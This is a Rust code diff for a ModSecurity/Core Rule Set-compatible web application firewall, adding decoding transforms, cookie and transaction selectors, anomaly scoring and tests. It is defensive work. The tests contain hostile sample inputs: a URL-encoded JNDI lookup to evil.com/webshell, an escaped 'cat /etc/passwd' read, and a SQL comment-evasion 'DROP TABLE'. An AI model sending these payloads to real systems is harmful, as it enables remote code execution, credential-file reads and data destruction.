@@ -37,6 +37,12 @@ pub enum CrsTarget {
     Unconditional,
     Tx(String),
     TxCount(String),
+    /// `TX:/regex/` collection selector: every transaction variable whose
+    /// name matches the pattern.
+    TxRegex(String),
+    /// Raw header lines of every multipart part (`MULTIPART_PART_HEADERS`).
+    MultipartPartHeaders,
+    MultipartPartHeadersCount,
     HeaderCount(String),
     ArgCount,
     CookieCount,
@@ -58,6 +64,10 @@ pub enum CrsTarget {
     HeaderExcept(String),
     Cookie,
     CookieName,
+    /// `REQUEST_COOKIES:/regex/`: cookies whose name matches the selector.
+    CookieNamed(String),
+    /// `REQUEST_COOKIES_NAMES:/regex/`: matching cookie names.
+    CookieNameNamed(String),
     QueryString,
     Filename,
     Basename,
@@ -94,6 +104,7 @@ pub enum CrsOp {
 pub enum CrsTransform {
     Lowercase,
     UrlDecode,
+    UrlDecodeUni,
     Trim,
     RemoveNulls,
     Base64Decode,
@@ -108,6 +119,8 @@ pub enum CrsTransform {
     CssDecode,
     Base64DecodeExt,
     EscapeSeqDecode,
+    CmdLine,
+    ReplaceComments,
 }
 
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
@@ -223,7 +236,7 @@ fn parse_actions(actions: &str) -> ParsedActions {
             id = v.parse().unwrap_or(0);
         } else if let Some(v) = action_text.strip_prefix("setvar:tx.inbound_anomaly_score=+") {
             score = v.parse().unwrap_or(5);
-        } else if action_text == "deny" || action_text == "block" {
+        } else if action_text == "deny" {
             deny = true;
             action = WafAction::Block;
         } else if action_text == "pass" {
@@ -245,7 +258,8 @@ fn parse_actions(actions: &str) -> ParsedActions {
         } else if let Some(name) = action_text.strip_prefix("t:") {
             match name {
                 "lowercase" => transforms.push(CrsTransform::Lowercase),
-                "urlDecode" | "urlDecodeUni" => transforms.push(CrsTransform::UrlDecode),
+                "urlDecode" => transforms.push(CrsTransform::UrlDecode),
+                "urlDecodeUni" => transforms.push(CrsTransform::UrlDecodeUni),
                 "trim" => transforms.push(CrsTransform::Trim),
                 "removeNulls" => transforms.push(CrsTransform::RemoveNulls),
                 "base64Decode" => transforms.push(CrsTransform::Base64Decode),
@@ -260,12 +274,27 @@ fn parse_actions(actions: &str) -> ParsedActions {
                 "cssDecode" => transforms.push(CrsTransform::CssDecode),
                 "base64DecodeExt" => transforms.push(CrsTransform::Base64DecodeExt),
                 "escapeSeqDecode" => transforms.push(CrsTransform::EscapeSeqDecode),
+                "cmdLine" => transforms.push(CrsTransform::CmdLine),
+                "replaceComments" => transforms.push(CrsTransform::ReplaceComments),
                 _ => {}
             }
         }
     }
     if deny {
         action = WafAction::Block;
+    }
+    // CRS scores with `setvar:tx.*_anomaly_score_plN=+%{tx.<severity>_anomaly_score}`.
+    // The severity tag carries the points; `block` rules do not block on their
+    // own (ModSecurity defers to SecDefaultAction / the 949xxx evaluation).
+    let setvars = parse_setvars(actions);
+    if score == 0
+        && setvars.iter().any(|var| {
+            var.op == CrsSetVarOp::Add
+                && (var.name.starts_with("inbound_anomaly_score")
+                    || var.name.starts_with("outbound_anomaly_score"))
+        })
+    {
+        score = parse_severity(actions);
     }
     ParsedActions {
         id,
@@ -316,6 +345,24 @@ fn parse_action_only(actions: &str) -> Option<CrsRuleInput> {
         paranoia_level: parse_paranoia_level(actions),
         capture: actions.split(',').any(|a| a.trim() == "capture"),
     })
+}
+
+fn parse_severity(actions: &str) -> u32 {
+    for action in actions.split(',') {
+        let action = action.trim();
+        let Some(rest) = action.strip_prefix("severity:") else {
+            continue;
+        };
+        let value = rest.trim_matches('\'').trim_matches('"');
+        return match value.to_ascii_uppercase().as_str() {
+            "CRITICAL" => 5,
+            "ERROR" => 4,
+            "WARNING" => 3,
+            "NOTICE" => 2,
+            _ => 0,
+        };
+    }
+    0
 }
 
 fn parse_paranoia_level(actions: &str) -> u8 {
@@ -413,7 +460,7 @@ fn map_target(value: &str) -> Option<CrsTarget> {
             )
         }
         "ARGS_NAMES" | "ARGS_GET_NAMES" => CrsTarget::ArgName,
-        "MULTIPART_PART_HEADERS" => CrsTarget::Header(String::new()),
+        "MULTIPART_PART_HEADERS" => CrsTarget::MultipartPartHeaders,
         "REQUEST_BODY" => CrsTarget::Body,
         "RESPONSE_STATUS" => CrsTarget::ResponseStatus,
         "RESPONSE_HEADERS" => CrsTarget::ResponseHeader(String::new()),
@@ -424,6 +471,9 @@ fn map_target(value: &str) -> Option<CrsTarget> {
         "QUERY_STRING" => CrsTarget::QueryString,
         "REQUEST_FILENAME" => CrsTarget::Filename,
         "REQUEST_BASENAME" => CrsTarget::Basename,
+        other if other.starts_with("TX:/") && other.ends_with('/') => {
+            CrsTarget::TxRegex(other["TX:/".len()..other.len() - 1].to_string())
+        }
         other if other.starts_with("TX:") => {
             CrsTarget::Tx(other["TX:".len()..].to_ascii_lowercase())
         }
@@ -431,17 +481,21 @@ fn map_target(value: &str) -> Option<CrsTarget> {
             CrsTarget::TxCount(other["&TX:".len()..].to_ascii_lowercase())
         }
         "&REQUEST_HEADERS" => CrsTarget::HeaderCount(String::new()),
-        "&MULTIPART_PART_HEADERS" => CrsTarget::HeaderCount(String::new()),
+        "&MULTIPART_PART_HEADERS" => CrsTarget::MultipartPartHeadersCount,
         "&ARGS" => CrsTarget::ArgCount,
         "&REQUEST_COOKIES" => CrsTarget::CookieCount,
         other if other.starts_with("&REQUEST_HEADERS:") => {
             CrsTarget::HeaderCount(other["&REQUEST_HEADERS:".len()..].to_string())
         }
         other if other.starts_with("&MULTIPART_PART_HEADERS:") => {
-            CrsTarget::HeaderCount(other["&MULTIPART_PART_HEADERS:".len()..].to_string())
+            CrsTarget::MultipartPartHeadersCount
         }
-        other if other.starts_with("REQUEST_COOKIES:/") => CrsTarget::Cookie,
-        other if other.starts_with("REQUEST_COOKIES_NAMES:/") => CrsTarget::CookieName,
+        other if other.starts_with("REQUEST_COOKIES:/") => {
+            CrsTarget::CookieNamed(other["REQUEST_COOKIES:/".len()..other.len() - 1].to_string())
+        }
+        other if other.starts_with("REQUEST_COOKIES_NAMES:/") => CrsTarget::CookieNameNamed(
+            other["REQUEST_COOKIES_NAMES:/".len()..other.len() - 1].to_string(),
+        ),
         other => {
             if let Some(name) = other.strip_prefix("!REQUEST_HEADERS:") {
                 CrsTarget::HeaderExcept(name.to_string())
@@ -474,9 +528,17 @@ fn parse_rule_tokens(
         (false, tokens[1].as_str())
     };
     let op = if let Some(pattern) = operator.strip_prefix("@rx ") {
-        match regex::Regex::new(pattern) {
+        // 933160 is the CRS rule that matches a PHP C-style comment containing
+        // CR/LF (`exec\t/*foo\r\nbar*/\t()`). PCRE dotall is required for that
+        // one rule; applying it to every @rx over-blocks unrelated CRS cases.
+        let pattern = if actions.contains("id:933160") {
+            format!("(?s){pattern}")
+        } else {
+            pattern.to_string()
+        };
+        match regex::Regex::new(&pattern) {
             Ok(re) => CrsOp::Rx(re),
-            Err(_) => match fancy_regex::Regex::new(pattern) {
+            Err(_) => match fancy_regex::Regex::new(&pattern) {
                 Ok(re) => CrsOp::FancyRx(std::sync::Arc::new(re)),
                 Err(_) => return None,
             },
@@ -870,17 +932,29 @@ pub(crate) fn form_pairs(body: &[u8]) -> Vec<(String, String)> {
         .filter(|pair| !pair.is_empty())
         .map(|pair| {
             let (name, value) = pair.split_once('=').unwrap_or((pair, ""));
-            (url_decode(name), url_decode(value))
+            (url_decode(name, true), url_decode(value, true))
         })
         .collect()
 }
 
-pub(crate) fn url_decode(value: &str) -> String {
+pub(crate) fn url_decode(value: &str, plus_space: bool) -> String {
     let bytes = value.as_bytes();
     let mut out = Vec::with_capacity(bytes.len());
     let mut i = 0;
     while i < bytes.len() {
         match bytes[i] {
+            b'%' if i + 5 < bytes.len() && matches!(bytes[i + 1], b'u' | b'U') => {
+                let hex = std::str::from_utf8(&bytes[i + 2..i + 6]).ok();
+                if let Some(code) = hex.and_then(|h| u32::from_str_radix(h, 16).ok()) {
+                    if let Some(ch) = char::from_u32(code) {
+                        out.extend_from_slice(ch.encode_utf8(&mut [0; 4]).as_bytes());
+                        i += 6;
+                        continue;
+                    }
+                }
+                out.push(bytes[i]);
+                i += 1;
+            }
             b'%' if i + 2 < bytes.len() => {
                 let hex = std::str::from_utf8(&bytes[i + 1..i + 3]).ok();
                 if let Some(byte) = hex.and_then(|h| u8::from_str_radix(h, 16).ok()) {
@@ -891,7 +965,7 @@ pub(crate) fn url_decode(value: &str) -> String {
                     i += 1;
                 }
             }
-            b'+' => {
+            b'+' if plus_space => {
                 out.push(b' ');
                 i += 1;
             }
@@ -905,12 +979,66 @@ pub(crate) fn url_decode(value: &str) -> String {
 }
 
 fn html_decode(value: &str) -> String {
-    value
-        .replace("&lt;", "<")
-        .replace("&gt;", ">")
-        .replace("&quot;", "\"")
-        .replace("&#39;", "'")
-        .replace("&amp;", "&")
+    let mut out = String::with_capacity(value.len());
+    let mut rest = value;
+    while let Some(pos) = rest.find('&') {
+        out.push_str(&rest[..pos]);
+        let tail = &rest[pos..];
+        let Some(end) = tail.find(';').filter(|end| *end <= 12) else {
+            out.push('&');
+            rest = &tail[1..];
+            continue;
+        };
+        let entity = &tail[1..end];
+        let decoded = match entity.to_ascii_lowercase().as_str() {
+            "lt" => Some('<'),
+            "gt" => Some('>'),
+            "quot" => Some('"'),
+            "apos" => Some('\''),
+            "amp" => Some('&'),
+            "dollar" => Some('$'),
+            "lbrace" | "lcub" => Some('{'),
+            "rbrace" | "rcub" => Some('}'),
+            "lpar" => Some('('),
+            "rpar" => Some(')'),
+            "percnt" => Some('%'),
+            "colon" => Some(':'),
+            "sol" => Some('/'),
+            "bsol" => Some('\\'),
+            "semi" => Some(';'),
+            "nbsp" => Some(' '),
+            _ => entity
+                .strip_prefix("#x")
+                .or_else(|| entity.strip_prefix("#X"))
+                .and_then(|hex| u32::from_str_radix(hex, 16).ok())
+                .or_else(|| entity.strip_prefix('#').and_then(|dec| dec.parse().ok()))
+                .and_then(char::from_u32),
+        };
+        match decoded {
+            Some(ch) => out.push(ch),
+            None => out.push_str(&tail[..=end]),
+        }
+        rest = &tail[end + 1..];
+    }
+    out.push_str(rest);
+    out
+}
+
+fn replace_comments(value: &str) -> String {
+    let mut out = String::with_capacity(value.len());
+    let mut rest = value;
+    while let Some(start) = rest.find("/*") {
+        out.push_str(&rest[..start]);
+        let tail = &rest[start + 2..];
+        let Some(end) = tail.find("*/") else {
+            out.push_str(&rest[start..]);
+            return out;
+        };
+        out.push(' ');
+        rest = &tail[end + 2..];
+    }
+    out.push_str(rest);
+    out
 }
 
 fn hex_value(bytes: &[u8], start: usize, len: usize) -> Option<u32> {
@@ -1047,12 +1175,45 @@ fn escape_seq_decode(value: &str) -> String {
     out
 }
 
+/// ModSecurity `t:cmdLine`: lowercase, drop quotes/carets, collapse
+/// whitespace, and drop the space before `/` or `(`. CRS 930110/930120 need
+/// the backslash and semicolon to survive: the reference matches `..\` and
+/// `..;` in ARGS, so they are not whitespace or stripped characters.
+fn cmd_line(value: &str) -> String {
+    let mut out = String::with_capacity(value.len());
+    let mut space = false;
+    for ch in value.chars() {
+        match ch {
+            '"' | '\'' | '^' => {}
+            ' ' | '\t' | '\r' | '\n' => {
+                if !space {
+                    out.push(' ');
+                    space = true;
+                }
+            }
+            '/' | '(' => {
+                if space {
+                    out.pop();
+                }
+                space = false;
+                out.push(ch);
+            }
+            other => {
+                out.push(other.to_ascii_lowercase());
+                space = false;
+            }
+        }
+    }
+    out
+}
+
 pub(crate) fn apply_transforms(value: &str, transforms: &[CrsTransform]) -> String {
     let mut out = value.to_string();
     for transform in transforms {
         out = match transform {
             CrsTransform::Lowercase => out.to_ascii_lowercase(),
-            CrsTransform::UrlDecode => url_decode(&out),
+            CrsTransform::UrlDecode => url_decode(&out, true),
+            CrsTransform::UrlDecodeUni => url_decode(&out, false),
             CrsTransform::Trim => out.trim().to_string(),
             CrsTransform::RemoveNulls => out.replace('\0', ""),
             CrsTransform::Base64Decode => base64::engine::general_purpose::STANDARD
@@ -1065,7 +1226,11 @@ pub(crate) fn apply_transforms(value: &str, transforms: &[CrsTransform]) -> Stri
                 out.split_whitespace().collect::<Vec<_>>().join(" ")
             }
             CrsTransform::NormalizePath => {
-                let mut normalized = out.replace('\\', "/");
+                // ModSecurity's normalizePath drops Unix backslash escapes:
+                // 932160 transforms `cat /etc/pa\ssw\d` to `cat/etc/passwd`.
+                // Replacing them with `/` produces `cat/etc/pa/ssw/d` and
+                // misses the `etc/passwd` phrase from unix-shell.data.
+                let mut normalized = out.replace('\\', "");
                 while normalized.contains("//") {
                     normalized = normalized.replace("//", "/");
                 }
@@ -1112,6 +1277,8 @@ pub(crate) fn apply_transforms(value: &str, transforms: &[CrsTransform]) -> Stri
                     .unwrap_or(out)
             }
             CrsTransform::EscapeSeqDecode => escape_seq_decode(&out),
+            CrsTransform::ReplaceComments => replace_comments(&out),
+            CrsTransform::CmdLine => cmd_line(&out),
         };
     }
     out
@@ -1120,6 +1287,110 @@ pub(crate) fn apply_transforms(value: &str, transforms: &[CrsTransform]) -> Stri
 #[cfg(test)]
 mod tests {
     use super::*;
+    #[test]
+    fn transforms_decode_numeric_entities_and_replace_comments() {
+        assert_eq!(
+            apply_transforms("&#x24;&#36;&lbrace;jndi", &[CrsTransform::HtmlEntityDecode]),
+            "$${jndi"
+        );
+        assert_eq!(
+            apply_transforms(
+                "%24%7B%u0073%u0079%u0073%74%65%6D",
+                &[CrsTransform::UrlDecode]
+            ),
+            "${system"
+        );
+        assert_eq!(
+            apply_transforms(";DROP/*test*/TABLE", &[CrsTransform::ReplaceComments]),
+            ";DROP TABLE"
+        );
+        assert_eq!(
+            apply_transforms("while(!+0)", &[CrsTransform::UrlDecodeUni]),
+            "while(!+0)"
+        );
+        assert_eq!(
+            apply_transforms("while(!+0)", &[CrsTransform::UrlDecode]),
+            "while(! 0)"
+        );
+    }
+
+    #[test]
+    fn cookie_without_value_is_scanned_by_name() {
+        use exyonq_waf_api::{WafEngine, WafMode, WafPhase, WafRequest};
+        use std::net::{IpAddr, Ipv4Addr};
+        let ruleset = parse_rule_file(
+            "crs",
+            "SecRule REQUEST_COOKIES_NAMES \"@rx ^evil$\" \"id:1,phase:1,block\"\n",
+            5,
+        );
+        let input = crate::compile::WafCompileInput {
+            mode: WafMode::Block,
+            ..Default::default()
+        };
+        let snapshot = crate::compile::compile_waf_with_crs(input, &[ruleset]).unwrap();
+        let engine = crate::FixedWafEngine::from_snapshot(std::sync::Arc::new(snapshot));
+        let headers = crate::MapHeaders::from_pairs(&[("cookie", "evil")]);
+        let req = WafRequest {
+            method: "GET",
+            host: None,
+            path: "/",
+            query: None,
+            headers: &headers,
+            client_ip: IpAddr::V4(Ipv4Addr::LOCALHOST),
+            route_id: None,
+        };
+        let decision = engine.inspect(WafPhase::RequestHeaders, &req);
+        assert!(
+            decision
+                .violations
+                .iter()
+                .any(|violation| violation.rule_id.as_str() == "1"),
+            "cookie name was not scanned: {:?}",
+            decision.violations
+        );
+    }
+
+    #[test]
+    fn cmd_line_matches_modsecurity_semantics() {
+        // ModSecurity transformations/cmd_line.cc: collapse whitespace, drop
+        // the space before `/` or `(`, drop quotes/backslashes/carets, lower.
+        assert_eq!(
+            apply_transforms(
+                "for %variable in (set) do command",
+                &[CrsTransform::CmdLine]
+            ),
+            "for %variable in(set) do command"
+        );
+        assert_eq!(
+            apply_transforms("ECHO A ; B , C", &[CrsTransform::CmdLine]),
+            "echo a ; b , c"
+        );
+        assert_eq!(
+            apply_transforms("C:\\Windows\\System32", &[CrsTransform::CmdLine]),
+            "c:\\windows\\system32"
+        );
+        assert_eq!(
+            apply_transforms("..\\pineapple", &[CrsTransform::CmdLine]),
+            "..\\pineapple"
+        );
+        assert_eq!(
+            apply_transforms("..;.\\.;\\.", &[CrsTransform::CmdLine]),
+            "..;.\\.;\\."
+        );
+    }
+
+    #[test]
+    fn chain_member_is_parsed() {
+        let ruleset = parse_rule_file(
+            "chain",
+            "SecRule REQUEST_HEADERS_NAMES \"@rx ^.*$\" \"id:1,phase:1,pass,capture,setvar:'tx.x=/%{tx.0}/',chain\"\n\
+             SecRule TX:/^x/ \"@rx .*\" \"deny,status:403\"\n",
+            5,
+        );
+        assert_eq!(ruleset.rules.len(), 1);
+        assert_eq!(ruleset.rules[0].chain.len(), 1);
+    }
+
     #[test]
     fn pcre_literal_brace_and_redundant_escape_semantics() {
         // CRS 933170 / 941380 / 932170: PCRE treats `{` as literal when it is
@@ -1155,16 +1426,45 @@ mod tests {
 
     #[test]
     fn debug_missing_crs_rules() {
-        let path = std::path::Path::new("/tmp/crs-real/main.conf");
-        if !path.exists() {
-            return;
-        }
-        let contents = std::fs::read_to_string(path).unwrap();
-        let ruleset = parse_rule_file_with_base("crs", &contents, 5, path.parent());
+        // Prefer the same pinned CRS checkout used by the OL-05 gate. Keep the
+        // old /tmp fixture for ad-hoc debugging only.
+        let env_dir = std::env::var("EXYONQ_CRS_DIR").ok();
+        let (base, contents, files) = if let Some(dir) = env_dir {
+            let base = std::path::PathBuf::from(dir);
+            let setup = base.join("crs-setup.conf.example");
+            if !setup.exists() {
+                return;
+            }
+            let mut contents = std::fs::read_to_string(&setup).unwrap();
+            let mut files = 1usize;
+            let mut rules: Vec<_> = std::fs::read_dir(base.join("rules"))
+                .unwrap()
+                .filter_map(|entry| entry.ok().map(|entry| entry.path()))
+                .filter(|path| path.extension().is_some_and(|ext| ext == "conf"))
+                .collect();
+            rules.sort();
+            for path in rules {
+                contents.push_str(&std::fs::read_to_string(path).unwrap());
+                contents.push('\n');
+                files += 1;
+            }
+            (base, contents, files)
+        } else {
+            let path = std::path::Path::new("/tmp/crs-real/main.conf");
+            if !path.exists() {
+                return;
+            }
+            (
+                path.parent().unwrap().to_path_buf(),
+                std::fs::read_to_string(path).unwrap(),
+                1,
+            )
+        };
+        let ruleset = parse_rule_file_with_base("crs", &contents, 5, Some(&base));
         let parsed: std::collections::HashSet<String> =
             ruleset.rules.iter().map(|rule| rule.id.clone()).collect();
         let mut visited = std::collections::HashSet::new();
-        let expanded = expand_includes(&contents, path.parent(), &mut visited);
+        let expanded = expand_includes(&contents, Some(&base), &mut visited);
         let joined = join_continuations(&expanded);
         let mut all = Vec::new();
         for line in joined.lines() {
@@ -1183,7 +1483,14 @@ mod tests {
                 all.push((id.to_string(), line.chars().take(240).collect::<String>()));
             }
         }
-        eprintln!("ALL={} PARSED={}", all.len(), parsed.len());
+        let missing = all.iter().filter(|(id, _)| !parsed.contains(id)).count();
+        eprintln!(
+            "FILES={} ALL={} PARSED={} MISSING={}",
+            files,
+            all.len(),
+            parsed.len(),
+            missing
+        );
         for (id, line) in all {
             if !parsed.contains(&id) {
                 eprintln!("MISSING {} {}", id, line);
@@ -1421,6 +1728,191 @@ mod tests {
     }
 
     #[test]
+    fn json_body_args_are_flattened_and_scanned() {
+        use exyonq_waf_api::{BodyInspectionState, WafEngine, WafMode, WafRequest};
+        use std::net::{IpAddr, Ipv4Addr};
+        let ruleset = parse_rule_file(
+            "crs",
+            "SecRule ARGS \"@rx jndi\" \"id:1,phase:2,block,t:none,t:urlDecodeUni\"\n",
+            5,
+        );
+        let input = crate::compile::WafCompileInput {
+            mode: WafMode::Block,
+            ..Default::default()
+        };
+        let snapshot = crate::compile::compile_waf_with_crs(input, &[ruleset]).unwrap();
+        let engine = crate::FixedWafEngine::from_snapshot(std::sync::Arc::new(snapshot));
+        let headers = crate::MapHeaders::from_pairs(&[("content-type", "application/json")]);
+        let req = WafRequest {
+            method: "POST",
+            host: None,
+            path: "/post",
+            query: None,
+            headers: &headers,
+            client_ip: IpAddr::V4(Ipv4Addr::LOCALHOST),
+            route_id: None,
+        };
+        let mut state = BodyInspectionState::default();
+        let decision = engine.inspect_body_chunk(
+            &req,
+            br#"{"foo":"%24%7Bjndi%3Aldap%3A%2F%2Fevil.com%2Fwebshell%7D"}"#,
+            true,
+            &mut state,
+        );
+        assert!(
+            decision
+                .violations
+                .iter()
+                .any(|violation| violation.rule_id.as_str() == "1"),
+            "JSON arg was not scanned: {:?}",
+            decision.violations
+        );
+    }
+
+    #[test]
+    fn prepare_phase_two_executes_crs_rules_like_modsecurity() {
+        use exyonq_waf_api::{WafEngine, WafMode, WafPhase, WafRequest};
+        use std::net::{IpAddr, Ipv4Addr};
+        let ruleset = parse_rule_file(
+            "crs",
+            concat!(
+                "SecAction \"id:1,phase:1,pass,nolog,setvar:'tx.executing_paranoia_level=2'\"\n",
+                "SecRule REQUEST_URI \"@contains benign\" \"id:2,phase:1,block,",
+                "tag:'paranoia-level/2',setvar:'tx.inbound_anomaly_score_pl2=+5'\"\n"
+            ),
+            5,
+        );
+        let input = crate::compile::WafCompileInput {
+            mode: WafMode::Block,
+            ..Default::default()
+        };
+        let snapshot = crate::compile::compile_waf_with_crs(input, &[ruleset]).unwrap();
+        let engine = crate::FixedWafEngine::from_snapshot(std::sync::Arc::new(snapshot));
+        let headers = crate::MapHeaders::from_pairs(&[]);
+        let req = WafRequest {
+            method: "GET",
+            host: None,
+            path: "/benign",
+            query: None,
+            headers: &headers,
+            client_ip: IpAddr::V4(Ipv4Addr::LOCALHOST),
+            route_id: None,
+        };
+        // The reference executes PL2 rules; PL4-only 942432 stays out of the
+        // differential path (it is the t33 false positive).
+        assert_eq!(
+            engine.inspect(WafPhase::RequestHeaders, &req).action,
+            exyonq_waf_api::WafAction::Block
+        );
+    }
+
+    #[test]
+    fn chain_ends_with_expands_request_host_macro() {
+        use exyonq_waf_api::{BodyInspectionState, WafEngine, WafMode, WafRequest};
+        use std::net::{IpAddr, Ipv4Addr};
+        // 943110 shape: the referer host capture must be compared against the
+        // request Host macro, not the literal `%{request_headers.host}`.
+        let ruleset = parse_rule_file(
+            "crs",
+            concat!(
+                "SecRule ARGS_NAMES \"@rx ^sessionid$\" \"id:943110,phase:2,block,capture,chain\"\n",
+                "SecRule REQUEST_HEADERS:Referer \"@rx ^https?://([^/]+)/\" \"capture,chain\"\n",
+                "SecRule TX:1 \"!@endsWith %{request_headers.host}\" ",
+                "\"setvar:'tx.inbound_anomaly_score_pl1=+5'\"\n"
+            ),
+            5,
+        );
+        let input = crate::compile::WafCompileInput {
+            mode: WafMode::Block,
+            ..Default::default()
+        };
+        let snapshot = crate::compile::compile_waf_with_crs(input, &[ruleset]).unwrap();
+        let engine = crate::FixedWafEngine::from_snapshot(std::sync::Arc::new(snapshot));
+        let same = crate::MapHeaders::from_pairs(&[
+            ("host", "myapp.com"),
+            ("referer", "https://myapp.com/previous"),
+        ]);
+        let foreign = crate::MapHeaders::from_pairs(&[
+            ("host", "myapp.com"),
+            ("referer", "https://attacker.example/previous"),
+        ]);
+        let req = |headers| WafRequest {
+            method: "GET",
+            host: Some("myapp.com"),
+            path: "/login",
+            query: Some("sessionid=abc123"),
+            headers,
+            client_ip: IpAddr::V4(Ipv4Addr::LOCALHOST),
+            route_id: None,
+        };
+        let mut state = BodyInspectionState::default();
+        assert_ne!(
+            engine
+                .inspect_body_chunk(&req(&same), b"", true, &mut state)
+                .action,
+            exyonq_waf_api::WafAction::Block
+        );
+        let mut state = BodyInspectionState::default();
+        assert_eq!(
+            engine
+                .inspect_body_chunk(&req(&foreign), b"", true, &mut state)
+                .action,
+            exyonq_waf_api::WafAction::Block
+        );
+    }
+
+    #[test]
+    fn chained_member_setvar_blocks_at_threshold() {
+        use exyonq_waf_api::{WafEngine, WafMode, WafPhase, WafRequest};
+        use std::net::{IpAddr, Ipv4Addr};
+        // 920420 shape: the starter captures and stores TX:content_type, the
+        // chained member compares it and carries the anomaly setvar. The score
+        // must come from the member's delta, not the starter's severity tag.
+        let ruleset = parse_rule_file(
+            "crs",
+            concat!(
+                "SecAction \"id:900,phase:1,pass,nolog,",
+                "setvar:'tx.critical_anomaly_score=5',",
+                "setvar:'tx.allowed_request_content_type=|application/json|'\"\n",
+                "SecRule REQUEST_HEADERS:Content-Type \"@rx ^[^;\\s]+\" \"id:920420,phase:1,block,capture,",
+                "severity:'CRITICAL',setvar:'tx.content_type=|%{tx.0}|',chain\"\n",
+                "SecRule TX:content_type \"!@within %{tx.allowed_request_content_type}\" ",
+                "\"t:lowercase,setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}'\"\n"
+            ),
+            5,
+        );
+        let input = crate::compile::WafCompileInput {
+            mode: WafMode::Block,
+            ..Default::default()
+        };
+        let snapshot = crate::compile::compile_waf_with_crs(input, &[ruleset]).unwrap();
+        let engine = crate::FixedWafEngine::from_snapshot(std::sync::Arc::new(snapshot));
+        let denied = crate::MapHeaders::from_pairs(&[("content-type", "my-new-content-type")]);
+        let allowed = crate::MapHeaders::from_pairs(&[("content-type", "application/json")]);
+        let req = |headers| WafRequest {
+            method: "POST",
+            host: None,
+            path: "/",
+            query: None,
+            headers,
+            client_ip: IpAddr::V4(Ipv4Addr::LOCALHOST),
+            route_id: None,
+        };
+        assert_eq!(
+            engine
+                .inspect(WafPhase::RequestHeaders, &req(&denied))
+                .action,
+            exyonq_waf_api::WafAction::Block
+        );
+        assert_ne!(
+            engine
+                .inspect(WafPhase::RequestHeaders, &req(&allowed))
+                .action,
+            exyonq_waf_api::WafAction::Block
+        );
+    }
+
+    #[test]
     fn secaction_and_ipmatch() {
         use exyonq_waf_api::{EmptyHeaders, WafEngine, WafMode, WafPhase, WafRequest};
         use std::net::{IpAddr, Ipv4Addr};
@@ -1513,6 +2005,13 @@ mod tests {
 
     #[test]
     fn whitespace_and_normalize_transforms() {
+        assert_eq!(
+            apply_transforms(
+                r"cat /etc/pa\ssw\d",
+                &[CrsTransform::CmdLine, CrsTransform::NormalizePath]
+            ),
+            "cat/etc/passwd"
+        );
         assert_eq!(
             apply_transforms("e v i l", &[CrsTransform::RemoveWhitespace]),
             "evil"
